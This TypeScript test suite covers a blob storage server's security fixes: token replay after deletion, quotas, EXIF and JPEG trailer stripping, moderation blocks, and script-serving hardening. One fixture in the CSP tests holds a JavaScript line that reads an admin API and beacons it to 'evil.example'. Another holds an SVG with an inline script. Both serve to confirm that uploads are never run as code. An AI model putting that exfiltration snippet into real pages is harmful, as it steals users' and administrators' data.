import { afterEach, describe, expect, test } from "bun:test";
import { ConfigSchema, type BusEvents } from "@beamhop/sdk";
import { AuthError, createImageProcessor, loadSharp, optionsFromConfig, parseAuthHeader, stripJpegMetadata, verifyAuthEvent } from "../src";
import { errorResponse } from "../src/http";
import { Semaphore, SemaphoreFullError } from "../src/limits";
import { fetchRemote } from "../src/mirror";
import { PNG_1x1, authHeader, createHarness, jpegWithExif, newUser, type Harness, xOf } from "./fakes";

let h: Harness | undefined;
afterEach(async () => {
  await h?.cleanup();
  h = undefined;
});

const alice = newUser();
const bob = newUser();
const staff = newUser();
const now = () => Math.floor(Date.now() / 1000);
const enc = (s: string) => new TextEncoder().encode(s);
const latin1 = (b: Uint8Array) => Buffer.from(b).toString("latin1");
const count = (b: Uint8Array, s: string) => latin1(b).split(s).length - 1;

const upload = (body: Uint8Array, opts: { sk?: Uint8Array; token?: string; type?: string; headers?: Record<string, string> } = {}) =>
  h!.request("/upload", {
    method: "PUT",
    body: body as BodyInit,
    headers: {
      authorization: opts.token ?? authHeader(opts.sk ?? alice.sk, "upload", { x: [xOf(body)] }),
      ...(opts.type ? { "content-type": opts.type } : {}),
      ...opts.headers,
    },
  });
// delete tokens are single-use: vary the expiration so two deletes in the same second get different event ids
let tokens = 0;
const del = (x: string, sk = alice.sk) =>
  h!.request(`/${x}`, { method: "DELETE", headers: { authorization: authHeader(sk, "delete", { x: [x], expiration: now() + 600 + ++tokens }) } });
const mirror = (x: string[], token?: string) =>
  h!.request("/mirror", {
    method: "PUT",
    body: JSON.stringify({ url: "https://remote.example/blob" }),
    headers: { "content-type": "application/json", authorization: token ?? authHeader(alice.sk, "upload", { x }) },
  });
/** a mirror source serving `body`, counting fetches */
const remote = (body: () => Uint8Array, type = "application/octet-stream", calls = { n: 0 }) =>
  (async () => (calls.n++, new Response(body() as BodyInit, { headers: { "content-type": type } }))) as unknown as typeof fetch;
const headUpload = (x: string, sk = bob.sk) =>
  h!.request("/upload", {
    method: "HEAD",
    headers: { authorization: authHeader(sk, "upload", { x: [x] }), "x-sha-256": x, "x-content-length": "100", "x-content-type": "image/png" },
  });

function events<K extends keyof BusEvents>(name: K) {
  const list: BusEvents[K][] = [];
  h!.bus.on(name, (p) => list.push(p));
  return list;
}

const seg = (marker: number, payload: number[]) => [0xff, marker, (payload.length + 2) >> 8, (payload.length + 2) & 0xff, ...payload];
const ascii = (s: string) => [...s].map((c) => c.charCodeAt(0));

describe("banned or deny-listed staff lose access to hidden blobs (1)", () => {
  test("GET of a blocked blob and unapproved listings need an active role", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    await upload(PNG_1x1);
    await h.svc.setStatus(x, "blocked", "admin");
    const get = () => h!.request(`/${x}`, { headers: { authorization: authHeader(staff.sk, "get", { x: [x] }) } });
    const list = async () => (await (await h!.request(`/list/${alice.pubkey}`, { headers: { authorization: authHeader(staff.sk, "list") } })).json()).length;
    await h.deps.stores.users.upsert(staff.pubkey, { role: "moderator" });
    expect((await get()).status).toBe(200);
    expect(await list()).toBe(1);
    await h.deps.stores.users.upsert(staff.pubkey, { status: "banned" });
    expect((await get()).status).toBe(404);
    expect(await list()).toBe(0);
    await h.deps.stores.users.upsert(staff.pubkey, { status: "active", denied: true });
    expect((await get()).status).toBe(404);
  });
});

describe("upload tokens stop working once their signer deletes the blob (2)", () => {
  const oldToken = (x: string[], sk = alice.sk) => authHeader(sk, "upload", { x, createdAt: now() - 60 });

  test("a captured upload token can't put a deleted blob back; a fresh one can", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    const token = oldToken([x]);
    expect((await upload(PNG_1x1, { token })).status).toBe(201);
    expect((await del(x)).status).toBe(200);
    const replay = await upload(PNG_1x1, { token });
    expect(replay.status).toBe(401);
    expect(replay.headers.get("x-reason")).toContain("predates");
    expect((await upload(PNG_1x1, { token, headers: { "x-sha-256": x } })).status).toBe(401); // refused before the body
    expect((await h.request(`/${x}`)).status).toBe(404);
    // re-signing right after the delete (same second, even a second behind) works
    expect((await upload(PNG_1x1)).status).toBe(201);
    // another owner's tokens are theirs: bob never deleted it
    expect((await upload(PNG_1x1, { token: oldToken([x], bob.sk) })).status).toBe(200);
  });

  test("the preflight and /mirror refuse it too, the mirror before downloading", async () => {
    const calls = { n: 0 };
    h = await createHarness({ useSharp: false, allowPrivateMirror: true, fetch: remote(() => PNG_1x1, "image/png", calls) });
    const x = xOf(PNG_1x1);
    const token = oldToken([x]);
    expect((await mirror([x], token)).status).toBe(201);
    expect((await del(x)).status).toBe(200);
    expect((await mirror([x], token)).status).toBe(401);
    expect(calls.n).toBe(1);
    const head = await h.request("/upload", {
      method: "HEAD",
      headers: { authorization: token, "x-sha-256": x, "x-content-length": String(PNG_1x1.length), "x-content-type": "image/png" },
    });
    expect(head.status).toBe(401);
  });

  test("an old token for the original bytes can't bring back the deleted stripped blob", async () => {
    h = await createHarness({ useSharp: false });
    await h.deps.settings.update({ blossom: { stripExif: true } } as never, "test");
    const { withExif, withoutExif } = jpegWithExif();
    const token = oldToken([xOf(withExif)]);
    const desc = await (await upload(withExif, { token })).json();
    expect(desc.sha256).toBe(xOf(withoutExif));
    expect((await del(desc.sha256)).status).toBe(200);
    expect((await upload(withExif, { token })).status).toBe(401);
  });

  test("an admin removing the blob voids its owners' older tokens", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    const token = oldToken([x]);
    expect((await upload(PNG_1x1, { token })).status).toBe(201);
    await h.svc.delete(x, "admin");
    expect((await upload(PNG_1x1, { token })).status).toBe(401);
  });
});

describe("a per-user quota of 0 means no storage (3)", () => {
  test("0 refuses uploads, preflights and mirrors; null falls back to the default; a default of 0 is unlimited", async () => {
    const calls = { n: 0 };
    h = await createHarness({ useSharp: false, allowPrivateMirror: true, fetch: remote(() => PNG_1x1, "image/png", calls) });
    await h.deps.stores.users.upsert(alice.pubkey, { blossomQuota: 0 });
    expect((await upload(PNG_1x1)).status).toBe(413);
    expect((await headUpload(xOf(PNG_1x1), alice.sk)).status).toBe(413);
    expect((await mirror([xOf(PNG_1x1)])).status).toBe(413);
    expect(await h.svc.get(xOf(PNG_1x1))).toBeUndefined();
    await h.deps.stores.users.upsert(alice.pubkey, { blossomQuota: null });
    await h.deps.settings.update({ blossom: { defaultQuotaBytes: 10 } } as never, "test");
    expect((await upload(PNG_1x1)).status).toBe(413);
    await h.deps.settings.update({ blossom: { defaultQuotaBytes: 0 } } as never, "test");
    expect((await upload(PNG_1x1)).status).toBe(201);
  });
});

describe("images appended after the primary JPEG are stripped (4)", () => {
  const { withExif, withoutExif } = jpegWithExif();
  const mpf = seg(0xe2, [...ascii("MPF"), 0, ...ascii("MM"), 0, 42, 0, 0, 0, 8]);

  test("pure-JS: the trailer and the MPF index go, the primary image stays byte-exact", () => {
    // primary with EXIF + MPF index, then a secondary image with its own EXIF ("GPS 52.52…")
    const primary = Uint8Array.from([...withExif.subarray(0, 2), ...mpf, ...withExif.subarray(2)]);
    const r = stripJpegMetadata(Uint8Array.from([...primary, ...withExif]));
    expect(r.stripped).toBe(true);
    expect(count(r.data, "GPS 52")).toBe(0);
    expect(count(r.data, "MPF")).toBe(0);
    expect(Buffer.from(r.data).equals(Buffer.from(withoutExif))).toBe(true);
    // a clean primary with a trailer is "stripped" of the trailer alone
    const clean = stripJpegMetadata(Uint8Array.from([...withoutExif, ...withExif]));
    expect(Buffer.from(clean.data).equals(Buffer.from(withoutExif))).toBe(true);
    // nothing after EOI and no metadata: untouched (hash stays)
    expect(stripJpegMetadata(withoutExif).stripped).toBe(false);
  });

  test("the primary's end is found past stuffing, restarts and tables between progressive scans", () => {
    const sos = seg(0xda, [1, 1, 0, 0, 63, 0]);
    const dhtWithEoiBytes = seg(0xc4, [0x10, 0xff, 0xd9, 0x00]); // FF D9 inside a table is not the EOI
    const primary = Uint8Array.from([
      0xff, 0xd8, ...seg(0xe0, [...ascii("JFIF"), 0, 1, 1, 0, 0, 1, 0, 1, 0, 0]), ...seg(0xdb, [0, ...new Array(64).fill(1)]),
      ...sos, 0x12, 0xff, 0x00, 0x34, 0xff, 0xd0, 0x56, 0xff, 0xff, // scan 1 (stuffing, RST0, fill byte)
      ...dhtWithEoiBytes, ...sos, 0x78, 0x9a, 0xff, 0xd9, // scan 2, EOI
    ]);
    const r = stripJpegMetadata(Uint8Array.from([...primary, ...withExif]));
    expect(r.stripped).toBe(true);
    expect(Buffer.from(r.data).equals(Buffer.from(primary))).toBe(true); // scan data (and its fill byte) kept verbatim
    // truncated (no EOI): nothing to cut, left alone
    expect(stripJpegMetadata(primary.subarray(0, primary.length - 2)).stripped).toBe(false);
  });

  test("with sharp, a clean primary followed by an EXIF-carrying image still gets the pure-JS pass", async () => {
    const sharp = (await loadSharp()) as unknown as ((...a: unknown[]) => any) | undefined;
    const p = await createImageProcessor({ useSharp: !!sharp });
    const primary: Uint8Array = sharp
      ? new Uint8Array(await sharp({ create: { width: 8, height: 8, channels: 3, background: "#0f0" } }).jpeg().toBuffer())
      : withoutExif;
    const r = await p.stripMetadata(Uint8Array.from([...primary, ...withExif]), "image/jpeg");
    expect(r.stripped).toBe(true);
    expect(count(r.data, "GPS 52")).toBe(0);
    expect(Buffer.from(r.data).equals(Buffer.from(primary))).toBe(true);
    // a clean JPEG with nothing appended stays byte-identical
    expect((await p.stripMetadata(primary, "image/jpeg")).stripped).toBe(false);
  });
});

describe("a block on the stripped blob also refuses the original bytes (5)", () => {
  test("mirroring the EXIF-carrying original after the stripped blob was blocked is refused, until unblocked", async () => {
    const { withExif } = jpegWithExif();
    h = await createHarness({ useSharp: false, allowPrivateMirror: true, fetch: remote(() => withExif, "image/jpeg") });
    await h.deps.settings.update({ blossom: { stripExif: true } } as never, "test");
    const s = (await (await upload(withExif)).json()).sha256;
    const o = xOf(withExif);
    await h.svc.block(s, "illegal", "admin");
    expect((await mirror([o])).status).toBe(403);
    expect((await headUpload(o)).status).toBe(403);
    expect((await h.request(`/${o}`)).status).toBe(404);
    await h.svc.unblock(s, "admin");
    expect((await mirror([o])).status).toBe(201);
  });

  test("a stripped blob moderated to 'blocked' refuses the original too", async () => {
    const { withExif } = jpegWithExif();
    h = await createHarness({ useSharp: false, allowPrivateMirror: true, fetch: remote(() => withExif, "image/jpeg") });
    await h.deps.settings.update({ blossom: { stripExif: true } } as never, "test");
    const s = (await (await upload(withExif)).json()).sha256;
    await h.svc.setStatus(s, "blocked", "admin");
    expect((await mirror([xOf(withExif)], authHeader(bob.sk, "upload", { x: [xOf(withExif)] }))).status).toBe(403);
  });
});

describe("DELETE doesn't reveal hidden blobs (6)", () => {
  test("non-owners get 404 for pending/blocked blobs, 403 only for approved ones", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    await upload(PNG_1x1);
    expect((await del(x, bob.sk)).status).toBe(403);
    await h.svc.setStatus(x, "pending", "admin");
    expect((await del(x, bob.sk)).status).toBe(404);
    await h.svc.setStatus(x, "blocked", "admin");
    expect((await del(x, bob.sk)).status).toBe(404);
    expect((await del("ab".repeat(32), bob.sk)).status).toBe(404);
    expect((await del(x)).status).toBe(200); // the owner still can
  });
});

describe("X-Reason is printable ASCII (7)", () => {
  test("a hook's localized rejection is a 403 with CORS, the full text in the body", async () => {
    h = await createHarness({ useSharp: false });
    h.deps.hooks.onBlobUpload(async () => ({ action: "reject", reason: "yasaklı içerik 🚫\r\nx" }), "tr-filter");
    const r = await upload(PNG_1x1);
    expect(r.status).toBe(403);
    expect(r.headers.get("access-control-allow-origin")).toBe("*");
    expect(r.headers.get("x-reason")).toBe("yasakl? i?erik ?? x");
    expect(await r.text()).toBe("yasaklı içerik 🚫\r\nx");
    expect(errorResponse(400, "nul\0byte").headers.get("x-reason")).toBe("nul?byte");
  });
});

describe("read tokens are capped too (8)", () => {
  test("a get/list token valid for more than 24h unlocks nothing hidden", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    await upload(PNG_1x1);
    await h.svc.setStatus(x, "pending", "admin");
    const get = (expiration: number) => h!.request(`/${x}`, { headers: { authorization: authHeader(alice.sk, "get", { x: [x], expiration }) } });
    const list = async (expiration: number) =>
      (await (await h!.request(`/list/${alice.pubkey}`, { headers: { authorization: authHeader(alice.sk, "list", { expiration }) } })).json()).length;
    expect((await get(now() + 600)).status).toBe(200);
    expect((await get(now() + 3 * 86400)).status).toBe(404);
    expect(await list(now() + 600)).toBe(1);
    expect(await list(now() + 3 * 86400)).toBe(0);
  });

  test("a token signed for a month can't be used in its last day either", () => {
    const header = authHeader(alice.sk, "get", { createdAt: now() - 29 * 86400, expiration: now() + 3600 });
    expect(() => verifyAuthEvent(parseAuthHeader(header)!, { verb: "get", domains: ["cdn.example.com"] })).toThrow(/too far/);
    const ok = authHeader(alice.sk, "get", { createdAt: now() - 3600, expiration: now() + 3600 });
    expect(verifyAuthEvent(parseAuthHeader(ok)!, { verb: "get", domains: ["cdn.example.com"] }).pubkey).toBe(alice.pubkey);
    expect(new AuthError("x").status).toBe(401);
  });
});

describe("pre-checks see moderation status, not only the blocklist (9)", () => {
  test("HEAD /upload and PUT /upload with X-SHA-256 refuse a blob moderated to 'blocked'", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    await upload(PNG_1x1);
    await h.svc.setStatus(x, "blocked", "admin");
    expect((await headUpload(x)).status).toBe(403);
    const put = await upload(PNG_1x1, { sk: bob.sk, headers: { "x-sha-256": x } });
    expect(put.status).toBe(403);
    expect(put.headers.get("x-reason")).toContain("blocked");
  });
});

describe("SVG with an XML prolog (10)", () => {
  const svg = enc('<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');

  test("is stored as image/svg+xml (allowed by image/*) and served as a sandboxed download", async () => {
    h = await createHarness({ useSharp: false });
    const res = await upload(svg, { type: "image/svg+xml" });
    expect(res.status).toBe(201);
    expect((await res.json()).type).toBe("image/svg+xml");
    const get = await h.request(`/${xOf(svg)}`);
    expect(get.headers.get("content-disposition")).toContain("attachment");
    expect(get.headers.get("content-security-policy")).toContain("sandbox");
  });

  test("a mirror labelling it as something else still stores it as SVG", async () => {
    h = await createHarness({ useSharp: false, allowPrivateMirror: true, fetch: remote(() => svg, "image/png") });
    const res = await mirror([xOf(svg)]);
    expect(res.status).toBe(201);
    expect((await res.json()).type).toBe("image/svg+xml");
  });

  test("other XML stays application/xml", async () => {
    h = await createHarness({ useSharp: false });
    await h.deps.settings.update({ blossom: { allowedMimeTypes: [] } } as never, "test");
    expect((await (await upload(enc('<?xml version="1.0"?><feed/>'))).json()).type).toBe("application/xml");
  });
});

describe("`uploaded` is the requesting owner's time (11)", () => {
  test("PUT /upload and /list agree for a second owner, and for a re-upload", async () => {
    h = await createHarness({ useSharp: false });
    await upload(PNG_1x1);
    await h.deps.stores.db.run("UPDATE blossom_blobs SET created_at = 1000");
    await h.deps.stores.db.run("UPDATE blossom_owners SET created_at = 1000");
    const second = await (await upload(PNG_1x1, { sk: bob.sk })).json();
    const listed = (await (await h.request(`/list/${bob.pubkey}`)).json())[0];
    expect(second.uploaded).toBe(listed.uploaded);
    expect(second.uploaded).toBeGreaterThan(1000);
    expect((await (await upload(PNG_1x1)).json()).uploaded).toBe(1000); // alice's own ownership time
  });
});

describe("mirror timeout is configurable (12)", () => {
  test("config.blossom.limits.mirrorTimeoutMs feeds the service options", () => {
    const config = ConfigSchema.parse({ blossom: { limits: { mirrorTimeoutMs: 120_000 } } });
    expect(optionsFromConfig(config).mirrorTimeoutMs).toBe(120_000);
    expect(() => ConfigSchema.parse({ blossom: { limits: { mirrorTimeoutMs: 10 } } })).toThrow();
  });
});

describe("admin actions are audited with the client IP and announced on the bus (13)", () => {
  test("setStatus, delete, block, unblock and deleteByPubkey", async () => {
    h = await createHarness({ useSharp: false });
    const actions = events("admin.action");
    const x = xOf(PNG_1x1);
    await upload(PNG_1x1);
    await h.svc.setStatus(x, "pending", "admin", { ip: "203.0.113.7" });
    await h.svc.delete(x, "admin", { block: true, ip: "203.0.113.8" });
    await h.svc.unblock(x, "admin", { ip: "203.0.113.9" });
    await h.svc.block("cd".repeat(32), "spam", "admin");
    await upload(PNG_1x1);
    expect(await h.svc.deleteByPubkey(alice.pubkey, "admin", { ip: "2001:db8::1" })).toBe(1);
    const audit = h.deps.stores.audit.entries.map((e) => [e.action, e.ip]);
    expect(audit).toEqual([
      ["blob.status", "203.0.113.7"],
      ["blob.block", "203.0.113.8"],
      ["blob.unblock", "203.0.113.9"],
      ["blob.block", null],
      ["blob.deleteByPubkey", "2001:db8::1"],
    ]);
    expect(actions.map((a) => [a.entry.action, a.entry.ip, a.entry.target])).toEqual(
      h.deps.stores.audit.entries.map((e) => [e.action, e.ip, e.target]),
    );
    expect(actions[0].entry).toMatchObject({ actor: "admin", details: { status: "pending" } });
  });
});

describe("dead code made live or removed (14)", () => {
  test("Semaphore.run enforces maxQueue itself", async () => {
    const sem = new Semaphore(1, 0);
    let release!: () => void;
    const held = sem.run(() => new Promise<void>((r) => (release = r)));
    await expect(sem.run(async () => 1)).rejects.toBeInstanceOf(SemaphoreFullError);
    release();
    await held;
    expect(await sem.run(async () => 2)).toBe(2);
  });

  test("mirror redirects stop after five hops", async () => {
    const hops = (n: number) => {
      let i = 0;
      return (async () => (i++ < n ? new Response(null, { status: 302, headers: { location: `/hop${i}` } }) : new Response("ok"))) as unknown as typeof fetch;
    };
    expect((await fetchRemote("https://a.example/", { fetch: hops(5), allowPrivate: true })).status).toBe(200);
    await expect(fetchRemote("https://a.example/", { fetch: hops(6), allowPrivate: true })).rejects.toMatchObject({ status: 502, reason: "too many redirects" });
  });
});

describe("follow-ups: deleted stripped uploads and slow clocks (2, review)", () => {
  test("an old token for the EXIF original can't revive the deleted stripped blob through /mirror", async () => {
    const { withExif } = jpegWithExif();
    const calls = { n: 0 };
    h = await createHarness({ useSharp: false, allowPrivateMirror: true, fetch: remote(() => withExif, "image/jpeg", calls) });
    await h.deps.settings.update({ blossom: { stripExif: true } } as never, "test");
    const o = xOf(withExif);
    const captured = authHeader(alice.sk, "upload", { x: [o], createdAt: now() - 60 });
    const s = (await (await upload(withExif, { token: captured })).json()).sha256;
    expect((await del(s)).status).toBe(200);
    expect((await upload(withExif, { token: captured })).status).toBe(401);
    expect((await mirror([o], captured)).status).toBe(401);
    expect(calls.n).toBe(0); // refused before downloading
    expect((await h.request(`/${o}`)).status).toBe(404);
    // the mapping is gone with the blob (nothing blocked), the deletion record covers the original by itself
    expect((await h.deps.stores.db.all("SELECT * FROM blossom_stripped")).length).toBe(0);
  });

  test("a client whose clock runs slow can re-sign and re-upload right after deleting", async () => {
    h = await createHarness({ useSharp: false });
    const skew = -120; // client clock 2 minutes behind the server
    const x = xOf(PNG_1x1);
    const signed = (offset: number) => authHeader(alice.sk, "upload", { x: [x], createdAt: now() + skew + offset });
    const before = signed(-10);
    expect((await upload(PNG_1x1, { token: before })).status).toBe(201);
    const delToken = authHeader(alice.sk, "delete", { x: [x], createdAt: now() + skew, expiration: now() + 600 });
    expect((await h.request(`/${x}`, { method: "DELETE", headers: { authorization: delToken } })).status).toBe(200);
    expect((await upload(PNG_1x1, { token: before })).status).toBe(401); // signed before the delete (its clock): void
    expect((await upload(PNG_1x1, { token: signed(1) })).status).toBe(201); // signed after it: fine
  });
});

describe("blobs are never served as runnable script (CSP review)", () => {
  const js = enc("fetch('/admin/api/users').then(r => r.text()).then(t => navigator.sendBeacon('https://evil.example', t));\n");
  const wasm = Uint8Array.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);

  test("JavaScript is served as text/plain and WebAssembly as opaque bytes, ranges and HEAD included", async () => {
    h = await createHarness({ useSharp: false });
    await h.deps.settings.update({ blossom: { allowedMimeTypes: [] } } as never, "test");
    const stored = await (await upload(js, { type: "text/javascript" })).json();
    expect(stored.type).toBe("text/javascript"); // stored and listed as what it is
    for (const init of [{}, { method: "HEAD" }, { headers: { range: "bytes=0-9" } }] as RequestInit[]) {
      const r = await h.request(`/${xOf(js)}.js`, init);
      expect(r.status).toBeLessThan(300);
      expect(r.headers.get("content-type")).toBe("text/plain; charset=utf-8");
      expect(r.headers.get("x-content-type-options")).toBe("nosniff");
    }
    expect((await upload(wasm)).status).toBe(201);
    expect((await h.request(`/${xOf(wasm)}`)).headers.get("content-type")).toBe("application/octet-stream");
    // admin previews get the same Content-Type
    expect((await h.svc.read(xOf(js)))?.type).toBe("text/plain; charset=utf-8");
  });

  test("requests that would run the response as code are refused", async () => {
    h = await createHarness({ useSharp: false });
    await upload(PNG_1x1);
    const x = xOf(PNG_1x1);
    for (const dest of ["script", "worker", "sharedworker", "serviceworker", "audioworklet", "paintworklet", "xslt", "Script"]) {
      expect((await h.request(`/${x}`, { headers: { "sec-fetch-dest": dest } })).status).toBe(403);
      expect((await h.request(`/thumb/${x}.webp`, { headers: { "sec-fetch-dest": dest } })).status).toBe(403);
    }
    for (const dest of ["image", "video", "document", "empty"]) expect((await h.request(`/${x}`, { headers: { "sec-fetch-dest": dest } })).status).toBe(200);
  });
});

describe("who moderated is recorded (admin rank checks)", () => {
  test("moderatedBy follows the status; blockedBy names who blocked the hash", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    await upload(PNG_1x1);
    expect((await h.svc.get(x))?.moderatedBy).toBeNull();
    await h.svc.setStatus(x, "pending", "mod1");
    expect((await h.svc.get(x))?.moderatedBy).toBe("mod1");
    await h.svc.setStatus(x, "approved", "mod1");
    expect((await h.svc.get(x))?.moderatedBy).toBeNull();
    await h.svc.setStatus(x, "blocked", "mod2");
    expect((await h.svc.list({})).items[0].moderatedBy).toBe("mod2");
    // the owner deleting it puts the hash on the blocklist in the moderator's name
    expect((await del(x)).status).toBe(200);
    expect(await h.svc.blocklist()).toEqual([expect.objectContaining({ sha256: x, blockedBy: "mod2" })]);
    await h.svc.block("cd".repeat(32), "spam", "adm");
    await h.svc.delete("ef".repeat(32), "adm2", { block: true });
    const by = Object.fromEntries((await h.svc.blocklist()).map((b) => [b.sha256, b.blockedBy]));
    expect(by).toEqual({ [x]: "mod2", ["cd".repeat(32)]: "adm", ["ef".repeat(32)]: "adm2" });
  });

  test("a held-back blob that's deleted and re-uploaded keeps its moderator; requireApproval's own hold has none", async () => {
    h = await createHarness({ useSharp: false });
    const x = xOf(PNG_1x1);
    await upload(PNG_1x1);
    await h.svc.setStatus(x, "pending", "mod1");
    expect((await del(x)).status).toBe(200);
    expect((await upload(PNG_1x1)).status).toBe(201);
    expect(await h.svc.get(x)).toMatchObject({ status: "pending", moderatedBy: "mod1" });
    await h.deps.settings.update({ blossom: { requireApproval: true } } as never, "test");
    expect((await upload(enc("%PDF-1.4\n%%EOF\n"))).status).toBe(201);
    expect(await h.svc.get(xOf(enc("%PDF-1.4\n%%EOF\n")))).toMatchObject({ status: "pending", moderatedBy: null });
  });
});

describe("original → stripped mappings are pruned when they no longer matter", () => {
  test("kept while the stripped hash is blocked, dropped once it's unblocked and gone", async () => {
    const { withExif } = jpegWithExif();
    h = await createHarness({ useSharp: false });
    await h.deps.settings.update({ blossom: { stripExif: true } } as never, "test");
    const mappings = async () => (await h!.deps.stores.db.all("SELECT * FROM blossom_stripped")).length;
    const s = (await (await upload(withExif)).json()).sha256;
    expect(await mappings()).toBe(1);
    await h.svc.block(s, "illegal", "admin");
    expect(await mappings()).toBe(1); // still needed: the original bytes stay refused
    await h.svc.unblock(s, "admin");
    expect(await mappings()).toBe(0);
  });
});
